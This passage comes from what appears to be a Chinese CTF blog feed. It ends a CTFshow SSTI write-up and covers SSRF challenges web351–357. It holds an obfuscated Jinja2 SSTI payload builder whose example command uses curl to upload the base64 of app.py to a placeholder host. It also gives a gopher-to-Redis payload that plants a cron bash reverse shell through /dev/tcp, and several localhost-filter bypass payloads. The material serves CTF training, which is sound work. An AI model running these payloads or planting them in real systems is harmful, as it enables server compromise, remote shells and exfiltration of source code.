punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% set b=eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>run<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('curl -F file=`base64 app.py -w 0` http://xxxxx/').read()"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-ssrf</title>
      <link href="/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/"/>
      <url>/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><img src="begin.png" loading="lazy"></p><p>SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>如图，攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……</p><p>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h4 id="SSRF-的利用方式"><a href="#SSRF-的利用方式" class="headerlink" title="SSRF 的利用方式"></a>SSRF 的利用方式</h4><p>SSRF 利用相关的危险函数；SSRF 可利用的协议操作</p><h5 id="file-get-contents-与-readfile"><a href="#file-get-contents-与-readfile" class="headerlink" title="file_get_contents() 与 readfile()"></a><strong>file_get_contents() 与 readfile()</strong></h5><ul><li><code>file_get_contents</code>这一函数是把 **传入的参数(变量)**写入字符串，当把 <strong>传参</strong>是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</li></ul><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><strong>fsockopen()</strong></h5><ul><li><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code>如果调用失败，将返回false。</li></ul><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h5><ul><li>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供<code>curl_setopt()，curl_exec()和curl_close()</code>函数使用。</li></ul><h5 id="file-协议的利用"><a href="#file-协议的利用" class="headerlink" title="file 协议的利用"></a><strong>file 协议的利用</strong></h5><pre class="language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/password  # file:// 之后可以接任意文件</span></code></pre><h5 id="dict-协议的使用"><a href="#dict-协议的使用" class="headerlink" title="dict 协议的使用"></a><strong>dict 协议的使用</strong></h5><pre class="language-php" data-language="php"><code class="language-php">利用dict协议，dict<span class="token punctuation">:</span><span class="token comment">//ip/info 可获取本地redis服务配置信息。</span></code></pre><h5 id="gopher-协议的使用"><a href="#gopher-协议的使用" class="headerlink" title="gopher 协议的使用"></a><strong>gopher 协议的使用</strong></h5><p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p><pre class="language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> flushall<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token operator">|</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> <span class="token number">1</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> dbfilename rootredis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> save//redis-cli查看所有的keys及清空所有的数据</code></pre><p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于<code>Gopher</code>协议的 URL：</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span></code></pre><p>经过url解码便是：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gopher://127.0.0.1:6379/_*1 <span class="token variable">$8</span> flushall *3 <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> <span class="token number">1</span> <span class="token variable">$64</span> */1 * * * * <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/127.0.0.1/45952 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span> *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$3</span> <span class="token function">dir</span> <span class="token variable">$16</span> /var/www/html/ *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$10</span> dbfilename <span class="token variable">$4</span> root *1 <span class="token variable">$4</span> save quit</code></pre><h3 id="web351-360"><a href="#web351-360" class="headerlink" title="web351-360"></a>web351-360</h3><h4 id="web351-curl-exec"><a href="#web351-curl-exec" class="headerlink" title="web351(curl_exec)"></a>web351(curl_exec)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><ol><li><code>$ch=curl_init($url);</code>：这行代码初始化cURL会话，并将变量<code>$url</code>作为要请求的URL。</li><li><code>curl_setopt($ch, CURLOPT_HEADER, 0);</code>：设置cURL选项，告诉cURL不要在输出中包含HTTP头信息。</li><li><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>：设置cURL选项，使得执行<code>curl_exec</code>后返回的不是直接输出，而是将结果作为字符串返回。</li><li><code>$result=curl_exec($ch);</code>：执行cURL会话，并获取结果，存储在变量<code>$result</code>中。</li><li><code>curl_close($ch);</code>：关闭cURL会话，释放资源。</li></ol><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//localhost/flag.php</span>  url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///var/www/html/flag.php</span></code></pre><h4 id="web352-localhost-127-0-0-1绕过"><a href="#web352-localhost-127-0-0-1绕过" class="headerlink" title="web352(localhost|127.0.0.1绕过)"></a>web352(localhost|127.0.0.1绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker</code></pre><p>得有<code>http|https</code>但是ban了<code>localhost|127.0.0</code>(幽默过滤，后面没有1，所以之前payload也可以)</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">十六进制url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F.0.0.1/flag.php</span>八进制url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0177.0.0.1/flag.php</span><span class="token number">10</span> 进制整数格式url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2130706433/flag.php</span><span class="token number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="token number">0</span>xurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F000001/flag.php</span>还有一种特殊的省略模式<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>写成<span class="token number">127.1</span>用<span class="token constant">CIDR</span>绕过localhosturl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.127.127.127/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0.0.0.0/flag.php</span>payload：url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><p>补充一点</p><p><code>parse_url</code> 是 PHP 中的一个函数，用于解析一个 URL 并返回其组成部分作为数组。这个函数非常适用于需要从 URL 中提取协议、主机名、路径等信息的场景。</p><p><strong>函数原型</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$component</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre><p><strong>参数</strong></p><ul><li><p><code>$url</code>：需要解析的 URL 字符串。</p></li><li><p><code>$component</code>（可选）：指定返回 URL 的哪个部分。可以是以下常量之一：</p><ul><li><code>PHP_URL_SCHEME</code>：返回 URL 的协议部分（如 <code>http</code>, <code>https</code>）。</li><li><code>PHP_URL_HOST</code>：返回 URL 的主机部分（如 <code>www.example.com</code>）。</li><li><code>PHP_URL_PORT</code>：返回 URL 的端口部分（如果存在）。</li><li><code>PHP_URL_USER</code>：返回 URL 的用户名部分（如果存在）。</li><li><code>PHP_URL_PASS</code>：返回 URL 的密码部分（如果存在）。</li><li><code>PHP_URL_PATH</code>：返回 URL 的路径部分（如 <code>/path/to/resource</code>）。</li><li><code>PHP_URL_QUERY</code>：返回 URL 的查询字符串部分（如果存在）。</li><li><code>PHP_URL_FRAGMENT</code>：返回 URL 的片段标识符部分（如果存在）。</li></ul><p>如果省略此参数或设置为 <code>-1</code>，<code>parse_url</code> 将返回包含所有部分的数组。</p></li></ul><p><strong>返回值</strong></p><ul><li>如果成功，返回一个数组，包括 URL 的各个组成部分。</li><li>如果 URL 格式不正确或无法解析，返回 <code>false</code>。</li></ul><h4 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>多过滤了句号，上题Payload也可以</p><h4 id="web354-解析域名"><a href="#web354-解析域名" class="headerlink" title="web354(解析域名)"></a>web354(解析域名)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|1|0|。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>1和0过滤了</p><p>302跳转，vps搭一个 :</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>POST: url&#x3D;<a href="http://your-domain/ssrf/302.php">http://your-domain/ssrf/302.php</a><br>Y4师傅找到一个A记录是127.0.0.1的网站: <a href="http://sudo.cc/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%94%A8%E8%A7%A3%E6%9E%90%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%86">http://sudo.cc/，可以不用解析自己的了</a><br>payload:url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h4 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>没有做其他过滤，但限制了<code>host</code>的长度</p><p>0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</p><p>Payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><h4 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span></code></pre><h4 id="web357-重定向"><a href="#web357-重定向" class="headerlink" title="web357(重定向)"></a>web357(重定向)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 